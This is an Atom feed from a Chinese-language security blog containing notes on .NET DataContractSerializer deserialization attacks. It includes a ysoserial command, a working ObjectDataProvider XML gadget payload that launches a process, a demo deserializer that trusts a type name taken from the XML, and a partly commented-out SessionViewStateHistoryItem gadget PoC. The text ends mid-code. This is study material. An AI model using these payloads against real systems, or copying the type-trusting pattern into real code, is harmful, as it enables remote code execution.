<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ke1nys`Blog</title>
  
  <subtitle>q:1478456309</subtitle>
  <link href="https://ke1nys.github.io/atom.xml" rel="self"/>
  
  <link href="https://ke1nys.github.io/"/>
  <updated>2024-03-12T09:02:34.717Z</updated>
  <id>https://ke1nys.github.io/</id>
  
  <author>
    <name>ke1nys</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Dotnet-Deserialization-09</title>
    <link href="https://ke1nys.github.io/posts/aa209205.html"/>
    <id>https://ke1nys.github.io/posts/aa209205.html</id>
    <published>2024-03-12T09:02:15.000Z</published>
    <updated>2024-03-12T09:02:34.717Z</updated>
    
    <content type="html"><![CDATA[<h2 id="DataContractJsonSerializer"><a href="#DataContractJsonSerializer" class="headerlink" title="DataContractJsonSerializer"></a>DataContractJsonSerializer</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;DataContractJsonSerializer&quot;&gt;&lt;a href=&quot;#DataContractJsonSerializer&quot; class=&quot;headerlink&quot; title=&quot;DataContractJsonSerializer&quot;&gt;&lt;/a&gt;DataCont</summary>
      
    
    
    
    
    <category term="dotnet" scheme="https://ke1nys.github.io/tags/dotnet/"/>
    
  </entry>
  
  <entry>
    <title>Dotnet-Deserialization-08</title>
    <link href="https://ke1nys.github.io/posts/dd27a293.html"/>
    <id>https://ke1nys.github.io/posts/dd27a293.html</id>
    <published>2024-03-11T08:07:32.000Z</published>
    <updated>2024-03-12T09:04:46.323Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/Y4er/dotnet-deserialization/blob/main/DataContractSerializer.md">https://github.com/Y4er/dotnet-deserialization/blob/main/DataContractSerializer.md</a></p><h2 id="DataContractSerializer"><a href="#DataContractSerializer" class="headerlink" title="DataContractSerializer"></a>DataContractSerializer</h2><p>其实这个类和<code>xmlSerializer</code>是类似的  都是得控制type变量的值  还有传入的xml的值</p><p>(type的值必须得是序列化的类  不然会反序列化失败)</p><p>其不同的是这个类的序列化和反序列化的是依靠writeobject和readobject类</p><p>给个官方的Demo</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Xml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DataContractDeserialize</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// You must apply a DataContractAttribute or SerializableAttribute</span></span><br><span class="line">    <span class="comment">// to a class to have it serialized by the DataContractSerializer.</span></span><br><span class="line">    [<span class="meta">DataContract(Name = <span class="string">&quot;Customer&quot;</span>, Namespace = <span class="string">&quot;http://www.contoso.com&quot;</span>)</span>]</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Person</span></span><br><span class="line">    &#123;</span><br><span class="line">        [<span class="meta">DataMember()</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> FirstName;</span><br><span class="line">        [<span class="meta">DataMember</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> LastName;</span><br><span class="line">        [<span class="meta">DataMember()</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">int</span> Age;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Person</span>(<span class="params"><span class="built_in">string</span> newfName, <span class="built_in">string</span> newLName, <span class="built_in">int</span> age</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            FirstName = newfName;</span><br><span class="line">            LastName = newLName;</span><br><span class="line">            Age = age;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                WriteObject(<span class="string">&quot;DataContractSerializerExample.xml&quot;</span>);</span><br><span class="line">                ReadObject(<span class="string">&quot;DataContractSerializerExample.xml&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">catch</span> (SerializationException serExc)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(<span class="string">&quot;Serialization Failed&quot;</span>);</span><br><span class="line">                Console.WriteLine(serExc.Message);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception exc)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(<span class="string">&quot;The serialization operation failed: &#123;0&#125; StackTrace: &#123;1&#125;&quot;</span>,</span><br><span class="line">                exc.Message, exc.StackTrace);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">finally</span></span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(<span class="string">&quot;Press &lt;Enter&gt; to exit....&quot;</span>);</span><br><span class="line">                Console.ReadLine();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">WriteObject</span>(<span class="params"><span class="built_in">string</span> fileName</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;Creating a Person object and serializing it.&quot;</span>);</span><br><span class="line">            Person p1 = <span class="keyword">new</span> Person(<span class="string">&quot;bill&quot;</span>, <span class="string">&quot;gates&quot;</span>, <span class="number">100</span>);</span><br><span class="line">            FileStream writer = <span class="keyword">new</span> FileStream(fileName, FileMode.Create);</span><br><span class="line">            DataContractSerializer ser = <span class="keyword">new</span> DataContractSerializer(<span class="keyword">typeof</span>(Person));</span><br><span class="line">            ser.WriteObject(writer, p1);</span><br><span class="line">            writer.Close();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ReadObject</span>(<span class="params"><span class="built_in">string</span> fileName</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;Deserializing an instance of the object.&quot;</span>);</span><br><span class="line">            FileStream fs = <span class="keyword">new</span> FileStream(fileName, FileMode.Open);</span><br><span class="line">            XmlDictionaryReader reader = XmlDictionaryReader.CreateTextReader(fs, <span class="keyword">new</span> XmlDictionaryReaderQuotas());</span><br><span class="line">            DataContractSerializer ser = <span class="keyword">new</span> DataContractSerializer(<span class="keyword">typeof</span>(Person));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Deserialize the data and read it from the instance.</span></span><br><span class="line">            Person deserializedPerson = (Person)ser.ReadObject(reader, <span class="literal">true</span>);</span><br><span class="line">            reader.Close();</span><br><span class="line">            fs.Close();</span><br><span class="line">            Console.WriteLine(String.Format(<span class="string">&quot;&#123;0&#125; &#123;1&#125;, Age: &#123;2&#125;&quot;</span>, deserializedPerson.FirstName, deserializedPerson.LastName, deserializedPerson.Age));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码关键点在于<code>new DataContractSerializer(typeof(Person))</code>指定序列化对象类型Type，然后调用ReadObject()和WriteObject()进行序列化反序列化。</p><p>同样  如果我们要传入<code>ObjectDataProvider</code>生成的那个xml的poc的话  我们的type也必须是<code>ObjectDataProvider</code>(其实是ExpandedWrapper  这里说ObjectDataProvider是为了好理解一点  )</p><p>至于为啥是ExpandedWrapper的话建议去看02那一篇文章</p><h2 id="ObjectDataProvider-攻击链"><a href="#ObjectDataProvider-攻击链" class="headerlink" title="ObjectDataProvider (攻击链)"></a>ObjectDataProvider (攻击链)</h2><p>yso生成的poc</p><p><code>ysoserial.exe -f DataContractSerializer -g ObjectDataProvider -c &quot;calc&quot;</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">root</span> <span class="attr">type</span>=<span class="string">&quot;System.Data.Services.Internal.ExpandedWrapper`2[[System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]],System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ExpandedWrapperOfProcessObjectDataProviderpaO_SOqJL</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://schemas.datacontract.org/2004/07/System.Data.Services.Internal&quot;</span></span></span><br><span class="line"><span class="tag">                                                         <span class="attr">xmlns:c</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span></span></span><br><span class="line"><span class="tag">                                                         <span class="attr">xmlns:i</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">                                                         <span class="attr">xmlns:z</span>=<span class="string">&quot;http://schemas.microsoft.com/2003/10/Serialization/&quot;</span></span></span><br><span class="line"><span class="tag">                                                         &gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ExpandedElement</span> <span class="attr">z:Id</span>=<span class="string">&quot;ref1&quot;</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">__identity</span> <span class="attr">i:nil</span>=<span class="string">&quot;true&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://schemas.datacontract.org/2004/07/System&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">ExpandedElement</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ProjectedProperty0</span> <span class="attr">xmlns:a</span>=<span class="string">&quot;http://schemas.datacontract.org/2004/07/System.Windows.Data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a:MethodName</span>&gt;</span>Start<span class="tag">&lt;/<span class="name">a:MethodName</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a:MethodParameters</span> <span class="attr">xmlns:b</span>=<span class="string">&quot;http://schemas.microsoft.com/2003/10/Serialization/Arrays&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">b:anyType</span> <span class="attr">i:type</span>=<span class="string">&quot;c:string&quot;</span>&gt;</span>cmd<span class="tag">&lt;/<span class="name">b:anyType</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">b:anyType</span> <span class="attr">i:type</span>=<span class="string">&quot;c:string&quot;</span>&gt;</span>/c calc<span class="tag">&lt;/<span class="name">b:anyType</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">a:MethodParameters</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a:ObjectInstance</span> <span class="attr">z:Ref</span>=<span class="string">&quot;ref1&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">ProjectedProperty0</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ExpandedWrapperOfProcessObjectDataProviderpaO_SOqJL</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>demo</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Xml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DataContractDeserialize</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            ReadObject(<span class="string">&quot;D:\\Rider\\Project\\ConsoleApplication2\\ConsoleApplication2\\DataContractSerializerExample.xml&quot;</span>);</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ReadObject</span>(<span class="params"><span class="built_in">string</span> fileName</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> xml = File.ReadAllText(fileName);</span><br><span class="line">            XmlDocument xmlDocument = <span class="keyword">new</span> XmlDocument();</span><br><span class="line">            xmlDocument.LoadXml(xml);</span><br><span class="line">            XmlNode rootNode = xmlDocument.SelectSingleNode(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">            <span class="comment">//Console.WriteLine(rootNode.InnerXml);</span></span><br><span class="line">            XmlNode typeNode = rootNode.Attributes.GetNamedItem(<span class="string">&quot;type&quot;</span>);</span><br><span class="line">            Console.WriteLine(Type.GetType(typeNode.InnerText));</span><br><span class="line">            DataContractSerializer dataContractSerializer = <span class="keyword">new</span> DataContractSerializer(Type.GetType(typeNode.InnerText));</span><br><span class="line">            dataContractSerializer.ReadObject(<span class="keyword">new</span> XmlTextReader(<span class="keyword">new</span> StringReader(rootNode.InnerXml)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的话type直接就是从xml中获取的</p><p><img src="../images/image-20240312111312986.png" alt="image-20240312111312986"></p><p>调用栈</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Process.Start()</span><br><span class="line">[<span class="meta">Native to Managed Transition</span>]</span><br><span class="line">RuntimeMethodInfo.UnsafeInvokeInternal()</span><br><span class="line">RuntimeMethodInfo.Invoke()</span><br><span class="line">RuntimeType.InvokeMember()</span><br><span class="line">ObjectDataProvider.InvokeMethodOnInstance()</span><br><span class="line">ObjectDataProvider.QueryWorker()</span><br><span class="line">ObjectDataProvider.BeginQuery()</span><br><span class="line">ObjectDataProvider.set_ObjectInstance()</span><br><span class="line">[<span class="meta">Lightweight Method Call</span>]</span><br><span class="line">ClassDataContract.ReadXmlValue()</span><br><span class="line">XmlObjectSerializerReadContext.ReadDataContractValue()</span><br><span class="line">XmlObjectSerializerReadContext.InternalDeserialize()</span><br><span class="line">XmlObjectSerializerReadContext.InternalDeserialize()</span><br><span class="line">[<span class="meta">Lightweight Method Call</span>]</span><br><span class="line">ClassDataContract.ReadXmlValue()</span><br><span class="line">XmlObjectSerializerReadContext.ReadDataContractValue()</span><br><span class="line">XmlObjectSerializerReadContext.InternalDeserialize()</span><br><span class="line">XmlObjectSerializerReadContext.InternalDeserialize()</span><br><span class="line">DataContractSerializer.InternalReadObject()</span><br><span class="line">XmlObjectSerializer.ReadObjectHandleExceptions()</span><br><span class="line">DataContractSerializer.ReadObject()</span><br><span class="line">Program.ReadObject()</span><br><span class="line">Program.Main()</span><br></pre></td></tr></table></figure><h2 id="SessionViewStateHistoryItem-攻击链"><a href="#SessionViewStateHistoryItem-攻击链" class="headerlink" title="SessionViewStateHistoryItem(攻击链)"></a>SessionViewStateHistoryItem(攻击链)</h2><p><strong>(这个类是SessionViewState的内部类  我们得查SessionViewStateHistoryItem才能进入到SessionViewState类中  直接查SessionViewState是进不去的  因为这个类是internal类型  还有就是原生的dll也是没这个类的  我们得重新下载这个dll 然后再导入进去)</strong></p><p>这就是我踩的坑  所以记录一下这个过程</p><p>这个新链子  我们直接去yso看起构造方法</p><p><img src="../images/image-20240312111654111.png" alt="image-20240312111654111"></p><p>直接去看SetType函数获取的是哪个类</p><p><img src="../images/image-20240312111857605.png" alt="image-20240312111857605"></p><p>获取的刚好是我们这个需要构造的攻击链   如何接着往下看  看看其为什么要给这个类里的s参数赋值</p><p><img src="../images/image-20240312143439867.png" alt="image-20240312143439867"></p><p>在<code>SessionViewStateHistoryItem</code>这个类进行反序列化的时候  会调用这个s参数  然后进行LosFormatter的反序列化操作  这就是为什么要传s参数的原因</p><p>完整Poc</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> Microsoft.VisualStudio.Text.Formatting;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Specialized;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Web.UI;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Data;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Markup;</span><br><span class="line"><span class="keyword">using</span> System.Xml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DataContractDeserialize</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// [Serializable]</span></span><br><span class="line">    <span class="comment">// public class SessionViewStateHistoryItemMarshal : ISerializable</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     public SessionViewStateHistoryItemMarshal(string strB64LosFormatterPayload)</span></span><br><span class="line">    <span class="comment">//     &#123;</span></span><br><span class="line">    <span class="comment">//         B64LosFormatterPayload = strB64LosFormatterPayload;</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//     private string B64LosFormatterPayload &#123; get; &#125;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//     public void GetObjectData(SerializationInfo info, StreamingContext context)</span></span><br><span class="line">    <span class="comment">//     &#123;</span></span><br><span class="line">    <span class="comment">//         Type myType_SessionViewState = Type.GetType(&quot;System.Web.UI.MobileControls.SessionViewState, System.Web.Mobile, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&quot;);</span></span><br><span class="line">    <span class="comment">//         Type[] nestedTypes = myType_SessionViewState.GetNestedTypes(BindingFlags.NonPublic | BindingFlags.Instance);</span></span><br><span class="line">    <span class="comment">//         info.SetType(nestedTypes[0]); // to reach the SessionViewStateHistoryItem class (private)</span></span><br><span class="line">    <span class="comment">//         info.AddValue(&quot;s&quot;, B64LosFormatterPayload);</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// [Serializable]</span></span><br><span class="line">    <span class="comment">// public class TextFormattingRunPropertiesMarshal : ISerializable</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     protected TextFormattingRunPropertiesMarshal(SerializationInfo info, StreamingContext context)</span></span><br><span class="line">    <span class="comment">//     &#123;</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">//     string _xaml;</span></span><br><span class="line">    <span class="comment">//     public void GetObjectData(SerializationInfo info, StreamingContext context)</span></span><br><span class="line">    <span class="comment">//     &#123;</span></span><br><span class="line">    <span class="comment">//         Type typeTFRP = typeof(TextFormattingRunProperties);</span></span><br><span class="line">    <span class="comment">//         info.SetType(typeTFRP);</span></span><br><span class="line">    <span class="comment">//         info.AddValue(&quot;ForegroundBrush&quot;, _xaml);</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">//     public TextFormattingRunPropertiesMarshal(string cmd)</span></span><br><span class="line">    <span class="comment">//     &#123;</span></span><br><span class="line">    <span class="comment">//         // ObjectDataProvider</span></span><br><span class="line">    <span class="comment">//         ProcessStartInfo psi = new ProcessStartInfo();</span></span><br><span class="line">    <span class="comment">//         psi.FileName = &quot;cmd.exe&quot;;</span></span><br><span class="line">    <span class="comment">//         psi.Arguments = $&quot;/c &#123;cmd&#125;&quot;;</span></span><br><span class="line">    <span class="comment">//         StringDictionary dict = new StringDictionary();</span></span><br><span class="line">    <span class="comment">//         psi.GetType().GetField(&quot;environmentVariables&quot;, BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);</span></span><br><span class="line">    <span class="comment">//         Process p = new Process();</span></span><br><span class="line">    <span class="comment">//         p.StartInfo = psi;</span></span><br><span class="line">    <span class="comment">//         ObjectDataProvider odp = new ObjectDataProvider();</span></span><br><span class="line">    <span class="comment">//         odp.MethodName = &quot;Start&quot;;</span></span><br><span class="line">    <span class="comment">//         odp.IsInitialLoadEnabled = false;</span></span><br><span class="line">    <span class="comment">//         odp.ObjectInstance = p;</span></span><br><span class="line">    <span class="comment">//         _xaml = XamlWriter.Save(odp);   </span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//WriteObject(&quot;a.xml&quot;);</span></span><br><span class="line">            ReadObject(<span class="string">&quot;D:\\Rider\\Project\\ConsoleApplication2\\ConsoleApplication2\\DataContractSerializerExample.xml&quot;</span>);</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//         public static void WriteObject(string fileName)</span></span><br><span class="line"><span class="comment">//         &#123;</span></span><br><span class="line"><span class="comment">//             string losFormatterPayload;</span></span><br><span class="line"><span class="comment">//             using (MemoryStream memory = new MemoryStream())</span></span><br><span class="line"><span class="comment">//             &#123;</span></span><br><span class="line"><span class="comment">//                 LosFormatter losFormatter = new LosFormatter();</span></span><br><span class="line"><span class="comment">//                 //losFormatter.Serialize(memory, new TextFormattingRunPropertiesMarshal(&quot;calc&quot;));</span></span><br><span class="line"><span class="comment">//                 losFormatterPayload = Encoding.UTF8.GetString(memory.ToArray());</span></span><br><span class="line"><span class="comment">//             &#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// //             string payload = $@&quot;&lt;root type=&quot;&quot;System.Web.UI.MobileControls.SessionViewState+SessionViewStateHistoryItem, System.Web.Mobile, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&quot;&quot;&gt;&lt;SessionViewState.SessionViewStateHistoryItem xmlns:i=&quot;&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&quot; xmlns:x=&quot;&quot;http://www.w3.org/2001/XMLSchema&quot;&quot; xmlns:z=&quot;&quot;http://schemas.microsoft.com/2003/10/Serialization/&quot;&quot; xmlns=&quot;&quot;http://schemas.datacontract.org/2004/07/System.Web.UI.MobileControls&quot;&quot;&gt;</span></span><br><span class="line"><span class="comment">// //   &lt;s i:type=&quot;&quot;x:string&quot;&quot; xmlns=&quot;&quot;&quot;&quot;&gt;&#123;losFormatterPayload&#125;&lt;/s&gt;</span></span><br><span class="line"><span class="comment">// // &lt;/SessionViewState.SessionViewStateHistoryItem&gt;&lt;/root&gt;&quot;;</span></span><br><span class="line"><span class="comment">//             // SessionViewStateHistoryItemMarshal textFormattingRunPropertiesMarshal =</span></span><br><span class="line"><span class="comment">//             //     new SessionViewStateHistoryItemMarshal(payload);</span></span><br><span class="line"><span class="comment">//             // File.WriteAllText(fileName, payload);</span></span><br><span class="line"><span class="comment">//             // Console.WriteLine(payload);</span></span><br><span class="line"><span class="comment">//         &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ReadObject</span>(<span class="params"><span class="built_in">string</span> 